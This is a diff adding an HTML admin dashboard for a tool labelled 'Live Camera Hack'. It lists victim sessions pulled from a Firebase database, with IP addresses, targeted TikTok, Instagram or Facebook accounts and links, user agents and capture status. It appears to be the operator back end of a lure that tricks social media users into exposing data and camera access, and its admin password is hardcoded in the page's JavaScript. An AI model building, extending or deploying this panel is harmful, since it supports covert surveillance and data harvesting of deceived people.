@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0d0d0d;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 12px;
+            width: 360px;
+            max-width: 90%;
+            border: 1px solid #333;
+        }
+        .login-box h1 {
+            color: #ff4444;
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 22px;
+        }
+        .login-box p {
+            color: #888;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #333;
+            background: #0d0d0d;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            transition: border 0.3s;
+        }
+        .login-box input:focus {
+            border-color: #ff4444;
+            outline: none;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-box button:hover { background: #cc3333; }
+        .login-box .error {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+            font-size: 13px;
+        }
+        
+        /* Admin Dashboard */
+        .admin-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #333;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .admin-header h1 {
+            color: #ff4444;
+            font-size: 22px;
+        }
+        .admin-header .user {
+            color: #888;
+            font-size: 13px;
+        }
+        .admin-header button {
+            padding: 8px 20px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .admin-header button:hover { background: #444; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+        .stat-card .num {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ff4444;
+        }
+        .stat-card .label {
+            color: #888;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+        .table-container {
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow-x: auto;
+            border: 1px solid #2a2a2a;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        thead {
+            background: #222;
+        }
+        th {
+            padding: 14px 16px;
+            text-align: left;
+            color: #888;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+        td {
+            padding: 12px 16px;
+            border-top: 1px solid #2a2a2a;
+            font-size: 14px;
+        }
+        td .ip {
+            color: #0af;
+            font-family: monospace;
+        }
+        td .service {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .service-tiktok { background: #1a1a2e; color: #ff0050; }
+        .service-instagram { background: #1a0030; color: #e1306c; }
+        .service-facebook { background: #001030; color: #1877f2; }
+        td .status-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+        .status-waiting { background: #332200; color: #ffaa00; }
+        .status-active { background: #330000; color: #ff4444; }
+        .status-completed { background: #1a1a1a; color: #666; }
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+        .timestamp-col { font-size: 12px; color: #888; white-space: nowrap; }
+        @media (max-width: 768px) {
+            th, td { padding: 10px 12px; font-size: 13px; }
+        }
+        .logout-btn {
+            background: transparent;
+            border: 1px solid #444;
+            color: #aaa;
+            padding: 6px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .logout-btn:hover {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="config.js"></script>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-container">
+        <div class="login-box">
+            <h1>🔐 Admin Panel</h1>
+            <p>Enter password to access control panel</p>
+            <input type="password" id="passwordInput" placeholder="Enter password..." onkeydown="if(event.key==='Enter')login()">
+            <button onclick="login()">Login</button>
+            <div class="error" id="loginError">❌ Incorrect password</div>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div id="adminDashboard" style="display:none;">
+        <div class="admin-container">
+            <div class="admin-header">
+                <div>
+                    <h1>⚙️ Admin Control Panel</h1>
+                    <div class="user">Live Camera Hack • All Sessions Monitor</div>
+                </div>
+                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+            </div>
+
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="num" id="totalSessions">0</div>
+                    <div class="label">Total Sessions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="num" id="activeSessions" style="color:#ff4444;">0</div>
+                    <div class="label">Active Now</div>
+                </div>
+                <div class="stat-card">
+                    <div class="num" id="totalVisitors">0</div>
+                    <div class="label">Total Visitors</div>
+                </div>
+                <div class="stat-card">
+                    <div class="num" id="uniqueIPs" style="color:#0af;">0</div>
+                    <div class="label">Unique IPs</div>
+                </div>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Session ID</th>
+                            <th>IP Address</th>
+                            <th>Service</th>
+                            <th>Social Link</th>
+                            <th>Status</th>
+                            <th>Timestamp</th>
+                            <th>User Agent</th>
+                        </tr>
+                    </thead>
+                    <tbody id="sessionsTableBody">
+                        <tr><td colspan="8" class="no-data">Loading sessions...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ===== CONFIGURABLE ADMIN PASSWORD =====
+    // CHANGE THIS PASSWORD BEFORE DEPLOYMENT
+    const ADMIN_PASSWORD = "NawabZada@2026@Hacker";
+    
+    // SHA-256 hash function for password verification
+    async function hashPassword(password) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(password);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    // Stored hash (pre-computed for performance)
+    // Password: "NawabZada@2026@Hacker" hash
+    // We compute it on login
+
+    let isAuthenticated = false;
+
+    async function login() {
+        const password = document.getElementById('passwordInput').value;
+        const enteredHash = await hashPassword(password);
+        const adminHash = await hashPassword(ADMIN_PASSWORD);
+        
+        if (enteredHash === adminHash) {
+            isAuthenticated = true;
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('adminDashboard').style.display = 'block';
+            loadSessions();
+        } else {
+            document.getElementById('loginError').style.display = 'block';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').focus();
+        }
+    }
+
+    function logout() {
+        isAuthenticated = false;
+        document.getElementById('adminDashboard').style.display = 'none';
+        document.getElementById('loginScreen').style.display = 'flex';
+        document.getElementById('passwordInput').value = '';
+    }
+
+    function formatTimestamp(ts) {
+        if (!ts) return '--';
+        const d = new Date(ts);
+        return d.toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
+    }
+
+    function formatUserAgent(ua) {
+        if (!ua) return '--';
+        if (ua.length > 40) return ua.substring(0, 40) + '...';
+        return ua;
+    }
+
+    async function loadSessions() {
+        const sessionsRef = database.ref('all_sessions');
+        const visitorsRef = database.ref('visitors');
+        let sessionCount = 0;
+        let activeCount = 0;
+        const uniqueIPSet = new Set();
+
+        // Listen for all sessions
+        sessionsRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            const tbody = document.getElementById('sessionsTableBody');
+            
+            if (!data) {
+                tbody.innerHTML = '<tr><td colspan="8" class="no-data">No sessions found</td></tr>';
+                document.getElementById('totalSessions').textContent = '0';
+                document.getElementById('activeSessions').textContent = '0';
+                return;
+            }
+
+            const entries = Object.entries(data);
+            // Sort by timestamp descending
+            entries.sort((a, b) => {
+                const tsA = a[1].timestamp || 0;
+                const tsB = b[1].timestamp || 0;
+                return tsB - tsA;
+            });
+
+            let html = '';
+            let count = 0;
+            activeCount = 0;
+            uniqueIPSet.clear();
+
+            entries.forEach(([sessionId, session]) => {
+                count++;
+                sessionCount = count;
+                
+                if (session.ip) uniqueIPSet.add(session.ip);
+                if (session.status === 'active') activeCount++;
+
+                const status = session.status || 'waiting';
+                const statusClass = 'status-' + status;
+                const statusLabel = status === 'active' ? '🔴 Active' : status === 'completed' ? '✅ Completed' : '⏳ Waiting';
+
+                const service = session.service || '--';
+                const serviceClass = 'service-' + (service ? service.toLowerCase() : '');
+
+                html += `<tr>
+                    <td>${count}</td>
+                    <td style="font-family:monospace;font-size:11px;max-width:120px;overflow:hidden;text-overflow:ellipsis;" title="${sessionId}">${sessionId.substring(0, 20)}...</td>
+                    <td><span class="ip">${session.ip || '--'}</span></td>
+                    <td>${service !== '--' ? `<span class="service ${serviceClass}">${service}</span>` : '--'}</td>
+                    <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;" title="${session.socialLink || ''}">${session.socialLink || '--'}</td>
+                    <td><span class="status-badge ${statusClass}">${statusLabel}</span></td>
+                    <td class="timestamp-col">${formatTimestamp(session.timestamp)}</td>
+                    <td style="font-size:11px;color:#888;max-width:150px;overflow:hidden;text-overflow:ellipsis;" title="${session.userAgent || ''}">${formatUserAgent(session.userAgent)}</td>
+                </tr>`;
+            });
+
+            tbody.innerHTML = html;
+            document.getElementById('totalSessions').textContent = count;
+            document.getElementById('activeSessions').textContent = activeCount;
+            document.getElementById('uniqueIPs').textContent = uniqueIPSet.size;
+        });
+
+        // Count visitors
+        visitorsRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                document.getElementById('totalVisitors').textContent = Object.keys(data).length;
+            }
+        });
+    }
+
+    // Auto-login if password is in URL (for testing, remove for production)
+    // Not implemented for security
+    </script>
+</body>
+</html>
